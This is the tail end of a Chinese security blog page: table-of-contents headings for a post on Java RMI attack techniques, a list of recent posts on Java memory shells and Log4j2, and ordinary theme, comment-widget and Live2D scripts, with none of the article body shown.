href="#%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">加载远程对象</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">2.3.</span> <span class="toc-text">攻击服务端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%89%93%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">2.3.1.</span> <span class="toc-text">客户端打服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1-1"><span class="toc-number">2.3.2.</span> <span class="toc-text">加载远程对象</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI%E7%9A%84%E8%BF%9B%E9%98%B6%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">RMI的进阶攻击方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%80%E5%90%8E"><span class="toc-number">4.</span> <span class="toc-text">最后</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/1e460a5e/" title="java内存马_4">java内存马_4</a><time datetime="2026-02-19T14:58:21.000Z" title="发表于 2026-02-19 22:58:21">2026-02-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/80229ffd/" title="java内存马_3">java内存马_3</a><time datetime="2026-02-10T15:05:16.000Z" title="发表于 2026-02-10 23:05:16">2026-02-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/f725af6b/" title="java内存马_2">java内存马_2</a><time datetime="2026-02-07T11:35:44.000Z" title="发表于 2026-02-07 19:35:44">2026-02-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6e2cfed1/" title="java内存马_1">java内存马_1</a><time datetime="2026-02-06T13:36:29.000Z" title="发表于 2026-02-06 21:36:29">2026-02-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6cdb73/" title="Log4j2">Log4j2</a><time datetime="2026-02-04T12:50:56.000Z" title="发表于 2026-02-04 20:50:56">2026-02-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">©2025 - 2026 By 红烧花园宝宝</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.4.0-b2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'LXu2n/LXu2n.github.io',
      'data-repo-id': 'R_kgDOOuja2g',
      'data-category-id': 'DIC_kwDOOuja2s4C020T',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script defer="" src="/js/bubble.js"></script><script src="/styles/fish.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div><hr><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>